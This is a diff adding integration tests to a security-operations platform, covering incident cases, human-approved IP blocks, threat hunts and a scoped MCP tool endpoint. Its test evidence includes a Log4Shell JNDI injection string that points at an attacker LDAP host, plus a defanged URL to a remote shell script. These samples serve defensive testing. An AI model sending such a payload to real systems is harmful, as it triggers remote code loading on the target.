@@ -26,7 +26,7 @@ const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline t
     store = new SupabaseStore(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SECRET_KEY);
     wipe = async () => {
       for (const [t, c] of [['alert_notes', 'id'], ['firewall_rules', 'rule_id'], ['investigations', 'investigation_id'], ['server_logs', 'id'], ['alerts', 'alert_id'],
-        ['suppressions', 'id'], ['assets', 'ip_address'], ['cves', 'cve_id'], ['app_config', 'key'], ['audit_log', 'id'], ['api_keys', 'id'], ['users', 'id']]) {
+        ['suppressions', 'id'], ['approvals', 'approval_id'], ['hunt_runs', 'id'], ['hunts', 'hunt_id'], ['cases', 'case_id'], ['assets', 'ip_address'], ['cves', 'cve_id'], ['app_config', 'key'], ['audit_log', 'id'], ['api_keys', 'id'], ['users', 'id']]) {
         const { error } = await store.sb.from(t).delete().not(c, 'is', null);
         if (error) throw new Error(`wipe ${t}: ${error.message}`);
       }
@@ -294,6 +294,95 @@ const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline t
 
     ok((await call('POST', '/api/reset')).status === 403, 'reset disabled outside demo mode');
 
+    // ---- Cases, approvals, hunts and MCP ----------------------------------------
+    r = await call('POST', '/api/cases', { body: { title: 'Log4Shell against prod-web-core', severity: 'HIGH', alert_ids: [alertId, 'ALERT-NOPE'] } });
+    ok(r.status === 201 && r.json.linked === 1 && r.json.skipped === 1, 'case created; unknown alert ids are skipped');
+    const caseId = r.json.case_id;
+    ok((await call('POST', '/api/cases', { body: { title: 'x' } })).status === 400, 'case title is validated');
+    r = await call('POST', `/api/cases/${caseId}/iocs`, { body: { values: 'C2 at 185.220.101[.]45 and hxxp://update-cdn[.]top/x.sh, again 185.220.101.45' } });
+    ok(r.status === 201 && r.json.added.length === 2 && r.json.added.some((i) => i.value === '185.220.101.45'), 'defanged IOCs extracted and de-duplicated');
+    r = await call('POST', `/api/cases/${caseId}/tasks`, { body: { title: 'Patch log4j on prod-web-core', phase: 'Eradication' } });
+    const taskId = r.json.id;
+    r = await call('POST', `/api/cases/${caseId}/events`, { body: { kind: 'evidence', title: 'access.log', body: 'GET /?q=${jndi:ldap://185.220.101.45:1389/a}' } });
+    ok(r.status === 201 && r.json.sha256 === crypto.createHash('sha256').update('GET /?q=${jndi:ldap://185.220.101.45:1389/a}').digest('hex'), 'evidence is SHA-256 hashed on arrival');
+    ok((await call('POST', `/api/cases/${caseId}/events`, { body: { kind: 'timeline', body: 'x' } })).status === 400, 'timeline entries need a time');
+    ok((await call('POST', `/api/cases/${caseId}/close`, { body: { resolution: 'Patched and blocked the source.' } })).status === 409, 'case cannot close with open tasks');
+    await call('PATCH', `/api/cases/${caseId}/tasks/${taskId}`, { body: { status: 'DONE' } });
+    r = await call('GET', `/api/cases/${caseId}`);
+    ok(r.json.case.status === 'IN_PROGRESS' && r.json.alerts.length === 1 && r.json.events.some((e) => e.kind === 'event'), 'case detail carries alerts, timeline and status');
+    ok((await call('GET', `/api/alerts/${alertId}/cases`)).json[0].case_id === caseId, 'alert lists its cases');
+    r = await call('POST', `/api/cases/${caseId}/close`, { body: { resolution: 'Patched and blocked the source.' } });
+    ok(r.status === 200 && r.json.status === 'CLOSED', 'case closed with a resolution');
+    ok((await call('POST', `/api/cases/${caseId}/tasks`, { body: { title: 'late' } })).status === 409, 'closed case is read-only');
+    ok((await call('GET', '/api/cases/metrics')).json.closed === 1, 'case metrics count closed cases');
+    r = await call('POST', '/api/cases/from-killchain', { body: { ip: '185.220.101.45', hours: 48 } });
+    ok(r.status === 201 && r.json.source === 'kill-chain' && r.json.linked >= 1, 'kill-chain case groups alerts by attacker');
+    ok((await call('GET', `/api/cases/${r.json.case_id}`)).json.tasks.length >= 4, 'kill-chain case seeds a response checklist');
+
+    // Manual approval mode: the engine proposes, a human decides.
+    ok((await call('PUT', '/api/config', { body: { approvalMode: 'confidence', approvalAutoAt: 80, approvalQuickAt: 90 } })).status === 400, 'approval bands must descend');
+    ok((await call('PUT', '/api/config', { body: { approvalMode: 'manual' } })).status === 200, 'approval mode set to manual');
+    r = await call('POST', '/api/approvals', { body: { action: 'BLOCK', target_ip: '203.0.113.77', reason: 'Credential stuffing source', confidence: 72 } });
+    ok(r.status === 201 && r.json.approval.status === 'PENDING' && r.json.approval.route === 'analyst_review', 'proposal queued with its route');
+    const apr = r.json.approval.approval_id;
+    ok((await call('POST', '/api/approvals', { body: { action: 'BLOCK', target_ip: '203.0.113.77', reason: 'again please' } })).json.duplicate === true, 'duplicate proposal joins the open one');
+    ok((await call('POST', '/api/approvals', { body: { action: 'BLOCK', target_ip: '10.0.4.15', reason: 'nope nope' } })).status === 400, 'internal block refused');
+    ok((await call('GET', '/api/approvals/count')).json.pending === 1, 'pending count');
+    ok((await call('POST', `/api/approvals/${apr}/reject`, { body: {} })).status === 400, 'rejection needs a reason');
+    r = await call('POST', `/api/approvals/${apr}/approve`, { body: { note: 'Seen in AbuseIPDB' } });
+    ok(r.status === 200 && r.json.approval.status === 'APPROVED' && r.json.rule.target_ip === '203.0.113.77', 'approval executes the block');
+    ok((await call('POST', `/api/approvals/${apr}/approve`, { body: {} })).status === 409, 'an approval is decided once');
+    await call('PUT', '/api/config', { body: { approvalMode: 'auto' } });
+
+    // Hunts over stored telemetry.
+    ok((await call('POST', '/api/hunts', { body: { name: 'JNDI', hypothesis: 'short' } })).status === 400, 'hunt needs a hypothesis');
+    r = await call('POST', '/api/hunts', { body: { name: 'JNDI lookups in web logs', hypothesis: 'Log4Shell probes reached our web tier', criteria: { text: 'jndi', window_hours: 48 } } });
+    ok(r.status === 201, 'hunt saved');
+    const huntId = r.json.hunt_id;
+    r = await call('POST', `/api/hunts/${huntId}/run`, { body: {} });
+    ok(r.status === 200 && r.json.hits >= 1 && r.json.findings.some((f) => f.kind === 'alert'), 'hunt finds the Log4Shell alert');
+    r = await call('POST', `/api/hunts/${huntId}/run`, { body: {} });
+    ok(r.json.new_hits === 0, 'second run reports nothing new');
+    r = await call('POST', '/api/hunts/adhoc', { body: { criteria: { ip: '185.220.101.0/24' } } });
+    ok(r.status === 200 && r.json.hits >= 1, 'ad-hoc CIDR hunt');
+    ok((await call('POST', `/api/hunts/runs/${r.json.run_id}/replay`, { body: {} })).json.hits === r.json.hits, 'run replays from its stored criteria');
+    ok((await call('POST', '/api/hunts/adhoc', { body: { criteria: { text: '/(/' } } })).status === 400, 'bad regex rejected');
+    ok(Array.isArray((await call('GET', '/api/hunts/techniques?days=7')).json.techniques), 'ATT&CK rollup');
+
+    // MCP over HTTP with API keys.
+    const rpc = (key, body) => call('POST', '/mcp', { as: null, body, headers: key ? { Authorization: `Bearer ${key}` } : {} });
+    ok((await rpc(null, { jsonrpc: '2.0', id: 1, method: 'initialize', params: {} })).status === 401, 'MCP needs a key');
+    ok((await rpc(ingestKey, { jsonrpc: '2.0', id: 1, method: 'initialize', params: {} })).status === 403, 'ingest key cannot use MCP');
+    r = await call('POST', '/api/keys', { body: { name: 'claude-desktop', scopes: ['mcp'] } });
+    const mcpRead = r.json.key;
+    r = await call('POST', '/api/keys', { body: { name: 'soc-agent', scopes: ['mcp:write'] } });
+    const mcpWrite = r.json.key;
+    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 't', version: '1' } } });
+    ok(r.json.result.protocolVersion === '2025-03-26' && r.json.result.serverInfo.name === 'aegis-security', 'MCP initialize negotiates the version');
+    ok((await rpc(mcpRead, { jsonrpc: '2.0', method: 'notifications/initialized' })).status === 202, 'notification gets 202');
+    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 2, method: 'tools/list' });
+    const readTools = r.json.result.tools.map((t) => t.name);
+    ok(readTools.includes('list_alerts') && !readTools.includes('block_ip'), 'read-only key sees read tools only');
+    r = await rpc(mcpWrite, { jsonrpc: '2.0', id: 3, method: 'tools/list' });
+    ok(r.json.result.tools.some((t) => t.name === 'block_ip' && t.inputSchema.required.includes('target_ip')), 'write key sees response tools');
+    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 4, method: 'tools/call', params: { name: 'get_alert', arguments: { alert_id: alertId } } });
+    ok(!r.json.result.isError && JSON.parse(r.json.result.content[0].text).alert.alert_id === alertId, 'tools/call returns real data');
+    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 5, method: 'tools/call', params: { name: 'block_ip', arguments: { target_ip: '203.0.113.9', reason: 'test' } } });
+    ok(r.json.result.isError === true, 'read key cannot call write tools');
+    r = await rpc(mcpWrite, { jsonrpc: '2.0', id: 6, method: 'tools/call', params: { name: 'block_ip', arguments: { target_ip: '203.0.113.9', reason: 'MCP containment test', ttl_hours: 1 } } });
+    ok(!r.json.result.isError && JSON.parse(r.json.result.content[0].text).rule.target_ip === '203.0.113.9', 'MCP block executes under auto policy');
+    r = await rpc(mcpWrite, [{ jsonrpc: '2.0', id: 7, method: 'ping' }, { jsonrpc: '2.0', id: 8, method: 'nope' }]);
+    ok(Array.isArray(r.json) && r.json[1].error.code === -32601, 'batch with unknown method');
+    ok((await call('GET', '/mcp', { as: null })).status === 405, 'GET /mcp is 405 (stateless)');
+    ok((await call('GET', '/api/audit?limit=200')).json.some((a) => a.action === 'mcp.call' && a.actor === 'mcp:soc-agent'), 'MCP calls are audited');
+
+    // A database without the casework migration: those routes answer 503, the rest keeps working.
+    store.pending = { migration: '20261018000000_cases_approvals_hunts.sql', error: 'relation "cases" does not exist' };
+    r = await call('GET', '/api/cases');
+    ok(r.status === 503 && /20261018000000/.test(r.json.error), 'missing casework migration answers 503');
+    ok((await call('GET', '/api/alerts?limit=1')).status === 200, 'core API unaffected by missing migration');
+    ok((await call('GET', '/api/health')).json.pending_migration === '20261018000000_cases_approvals_hunts.sql', 'health reports the pending migration');
+    store.pending = null;
     // Password change revokes the old cookie.
     const oldCookie = jar.admin;
     r = await call('POST', '/api/auth/password', { body: { current_password: 'Str0ngPassword', new_password: 'Newer1Password' } });
